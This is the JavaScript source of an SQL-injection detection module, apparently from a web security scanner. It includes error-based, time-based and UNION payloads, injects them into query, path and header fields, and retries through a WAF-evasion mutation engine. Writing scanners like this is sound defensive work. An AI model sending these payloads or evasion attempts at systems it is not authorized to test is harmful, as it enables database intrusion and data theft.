// backend/src/tests/sqlTest.js — FULL REWRITE
// Complete SQL Injection detection: Error-based, Time-based, OAST blind, Union-based
// Tests all injection points: URL params, POST body, JSON, HTTP headers
import axios from 'axios';

const DB_ERROR_PATTERNS = [
    { db: 'MySQL', patterns: [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySqlClient\./i, /com\.mysql\.jdbc/i] },
    { db: 'PostgreSQL', patterns: [/PostgreSQL.*ERROR/i, /Warning.*pg_/i, /Npgsql\./i, /org\.postgresql/i] },
    { db: 'MSSQL', patterns: [/Driver.*SQL.*Server/i, /OLE DB.*SQL Server/i, /SQLServer JDBC/i, /SqlException/i, /Unclosed quotation mark/i] },
    { db: 'Oracle', patterns: [/Oracle error/i, /Oracle.*Driver/i, /Warning.*oci_/i, /ORA-\d{5}/i] },
    { db: 'SQLite', patterns: [/sqlite3\.OperationalError/i, /SQLITE_ERROR/i, /SQLite\/JDBCDriver/i] }
];

const ERROR_PAYLOADS = ["'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "1' AND '1'='2", "admin' --", "\" OR \"1\"=\"1", "') OR ('1'='1"];
const UNION_PAYLOADS_PREFIX = "' UNION SELECT ";
const TIME_PAYLOADS = [
    { payload: "' AND SLEEP(5)--", db: 'MySQL', delay: 5 },
    { payload: "' AND pg_sleep(5)--", db: 'PostgreSQL', delay: 5 },
    { payload: "'; WAITFOR DELAY '00:00:05'--", db: 'MSSQL', delay: 5 },
    { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", db: 'MySQL', delay: 5 }
];

// HTTP headers to test for injection
const INJECTABLE_HEADERS = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host', 'Cookie'];

export async function testSQLInjection(endpoint, options = {}) {
    const findings = [];
    const aggressive = options.aggressive || false;
    const oastClient = options.oastClient || null;
    const timeout = options.timeout || 10000;

    // Collect all injection points
    const injectionPoints = getInjectionPoints(endpoint, aggressive);

    for (const point of injectionPoints) {
        // 1. Error-based detection
        const errorFinding = await testErrorBased(endpoint, point, timeout, options);
        if (errorFinding) { findings.push(errorFinding); continue; }

        // 2. Time-based blind detection (if aggressive)
        if (aggressive) {
            const timeFinding = await testTimeBased(endpoint, point, timeout, options);
            if (timeFinding) { findings.push(timeFinding); continue; }
        }

        // 3. OAST-based blind detection (skip for headers — remote can't reach local callback)
        if (oastClient && point.type !== 'header') {
            const oastFinding = await testOASTBased(endpoint, point, oastClient, options);
            if (oastFinding) { findings.push(oastFinding); continue; }
        }

        // 4. Union-based detection (if aggressive)
        if (aggressive) {
            const unionFinding = await testUnionBased(endpoint, point, timeout, options);
            if (unionFinding) { findings.push(unionFinding); continue; }
        }
    }

    return findings;
}

function getInjectionPoints(endpoint, aggressive = false) {
    const points = [];
    // URL query parameters
    if (endpoint.parameters && typeof endpoint.parameters === 'object') {
        for (const param of Object.keys(endpoint.parameters)) {
            points.push({ type: 'query', name: param });
        }
    }
    // Try URL path segments with numeric values
    try {
        const urlObj = new URL(endpoint.url);
        const segments = urlObj.pathname.split('/').filter(Boolean);
        segments.forEach((seg, idx) => {
            if (/^\d+$/.test(seg) || /^[a-f0-9-]{36}$/i.test(seg)) {
                points.push({ type: 'path', name: `path_segment_${idx}`, index: idx, original: seg });
            }
        });
    } catch { /* ignore */ }
    // HTTP headers (only test in aggressive mode to avoid excessive timeouts)
    if (aggressive) {
        for (const header of INJECTABLE_HEADERS) {
            points.push({ type: 'header', name: header });
        }
    }
    return points;
}

async function testErrorBased(endpoint, point, timeout, options) {
    for (const payload of ERROR_PAYLOADS) {
        try {
            const resp = await sendInjected(endpoint, point, payload, timeout, true, options); // Aggressive mode true for SQLi
            if (!resp) continue;
            
            if (resp._evasionExhausted) {
                return buildFinding(endpoint, point, payload, 'WAF Blocked (Error-Based)', 'Unknown', 'INFO', 0.0, 100, [
                    { type: 'REQUEST', title: 'WAF Blocked Payload', content: `Injection Point: ${point.type}:${point.name}\nOriginal Payload: ${payload}` },
                    { type: 'LOG', title: 'Evasion Exhausted', content: `The WAF actively blocked this request. The engine attempted all 8 mutation levels up to '${resp._evasionName}' but could not bypass the firewall.` }
                ]);
            }

            const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
            for (const { db, patterns } of DB_ERROR_PATTERNS) {
                if (patterns.some(p => p.test(body))) {
                    let evidence = [
                        { type: 'REQUEST', title: 'SQL Injection Test', content: `Injection Point: ${point.type}:${point.name}\nPayload: ${resp._mutatedPayload || payload}` },
                        { type: 'RESPONSE', title: 'SQL Error Detected', content: `Database: ${db}\nStatus: ${resp.status}\nSQL error pattern matched in response body` }
                    ];
                    if (resp._evasionLevel) {
                        evidence.push({ type: 'LOG', title: 'WAF Evasion Successful', content: `Bypassed WAF using Level ${resp._evasionLevel}: ${resp._evasionName}` });
                    }
                    return buildFinding(endpoint, point, payload, 'Error-Based', db, 'CRITICAL', 9.8, 95, evidence);
                }
            }
        } catch { /* continue */ }
    }
    return null;
}

async function testTimeBased(endpoint, point, timeout, options) {
    for (const { payload, db, delay } of TIME_PAYLOADS) {
        try {
            const start = Date.now();
            await sendInjected(endpoint, point, payload, (delay + 5) * 1000, options.aggressive, options);
            const elapsed = Date.now() - start;
            if (elapsed >= delay * 1000) {
                return buildFinding(endpoint, point, payload, 'Time-Based Blind', db, 'HIGH', 8.6, 80, [
                    { type: 'REQUEST', title: 'Time-Based SQLi Test', content: `Injection Point: ${point.type}:${point.name}\nPayload: ${payload}\nExpected Delay: ${delay}s` },
                    { type: 'RESPONSE', title: 'Time Delay Confirmed', content: `Actual Response Time: ${elapsed}ms\nExpected Delay: ${delay * 1000}ms\nDatabase: ${db}` }
                ]);
            }
        } catch { /* continue */ }
    }
    return null;
}

async function testOASTBased(endpoint, point, oastClient, options) {
    const result = await oastClient.injectAndVerify({
        testType: 'sqli',
        context: `${point.type}:${point.name}`,
        injector: async (oast) => {
            // Try multiple OAST SQLi payloads
            for (const [dbName, payload] of Object.entries(oast.payloads)) {
                try { await sendInjected(endpoint, point, payload, 8000, options.aggressive, options); } catch { /* continue */ }
            }
        },
        timeout: 8000
    });
    if (result) {
        return buildFinding(endpoint, point, 'OAST DNS/HTTP Callback', 'OAST Blind', 'Unknown', 'CRITICAL', 9.8, 99, result.evidence);
    }
    return null;
}

async function testUnionBased(endpoint, point, timeout, options) {
    // Determine column count
    for (let cols = 1; cols <= 10; cols++) {
        const nulls = Array(cols).fill('NULL').join(',');
        const payload = `${UNION_PAYLOADS_PREFIX}${nulls}--`;
        try {
            const resp = await sendInjected(endpoint, point, payload, timeout, true, options);
            if (!resp) continue;
            
            if (resp._evasionExhausted) {
                return buildFinding(endpoint, point, payload, 'WAF Blocked (Union-Based)', 'Unknown', 'INFO', 0.0, 100, [
                    { type: 'REQUEST', title: 'WAF Blocked Payload', content: `Injection Point: ${point.type}:${point.name}\nOriginal Payload: ${payload}` },
                    { type: 'LOG', title: 'Evasion Exhausted', content: `The WAF actively blocked this request. The engine attempted all 8 mutation levels up to '${resp._evasionName}' but could not bypass the firewall.` }
                ]);
            }

            const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
            const hasError = DB_ERROR_PATTERNS.some(({ patterns }) => patterns.some(p => p.test(body)));
            if (!hasError && resp.status === 200) {
                return buildFinding(endpoint, point, payload, 'Union-Based', 'Unknown', 'CRITICAL', 9.8, 85, [
                    { type: 'REQUEST', title: 'Union-Based SQLi', content: `Injection Point: ${point.type}:${point.name}\nPayload: ${resp._mutatedPayload || payload}\nColumns: ${cols}` },
                    { type: 'RESPONSE', title: 'Union Query Accepted', content: `Status: ${resp.status}\nThe UNION SELECT with ${cols} columns returned a valid response without SQL errors.` }
                ]);
            }
        } catch { /* continue */ }
    }
    return null;
}

import { sendWithMutations } from '../engines/mutationEngine.js';

async function sendInjected(endpoint, point, payload, timeout, aggressive, options = {}) {
    const requestFn = async (currentPayload, evasiveHeaders = {}, requestOptions = {}) => {
        const headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', ...evasiveHeaders };
        
        // IAST Tracing Header Injection
        if (options.scanId) {
            headers['X-Secora-Trace'] = `${options.scanId}:${endpoint.assetId}:${endpoint.id}:sqli`;
        }

        try {
            if (point.type === 'query') {
                const testUrl = new URL(endpoint.url);
                if (requestOptions.hpp) {
                    testUrl.searchParams.append(point.name, requestOptions.hppParts.part1);
                    testUrl.searchParams.append(point.name, requestOptions.hppParts.part2);
                } else {
                    testUrl.searchParams.set(point.name, currentPayload);
                }
                return await axios.get(testUrl.toString(), { timeout, headers, validateStatus: () => true, maxRedirects: 3 });
            } else if (point.type === 'header') {
                headers[point.name] = currentPayload;
                return await axios.get(endpoint.url, { timeout, headers, validateStatus: () => true, maxRedirects: 3 });
            } else if (point.type === 'path') {
                const urlObj = new URL(endpoint.url);
                const segments = urlObj.pathname.split('/').filter(Boolean);
                segments[point.index] = encodeURIComponent(currentPayload);
                urlObj.pathname = '/' + segments.join('/');
                return await axios.get(urlObj.toString(), { timeout, headers, validateStatus: () => true, maxRedirects: 3 });
            }
        } catch { return null; }
    };
    
    return await sendWithMutations(payload, requestFn, aggressive, endpoint.url);
}

function buildFinding(endpoint, point, payload, technique, db, severity, cvss, confidence, evidence) {
    return {
        assetId: endpoint.assetId, endpointId: endpoint.id,
        title: `SQL Injection (${technique})`,
        description: `The ${point.type} parameter '${point.name}' is vulnerable to ${technique} SQL injection.${db !== 'Unknown' ? ` Database: ${db}.` : ''} Injection point: ${point.type}.`,
        category: 'INJECTION', severity, cvss, owasp: 'A03:2021', cwe: 'CWE-89',
        remediation: 'Use parameterized queries (prepared statements) for all database operations. Never concatenate user input into SQL queries. Implement input validation and use an ORM.',
        references: ['https://owasp.org/www-project-top-ten/2017/A1_2017-Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'],
        detectedBy: 'sql-injection-engine', confidence,
        evidence: evidence || []
    };
}
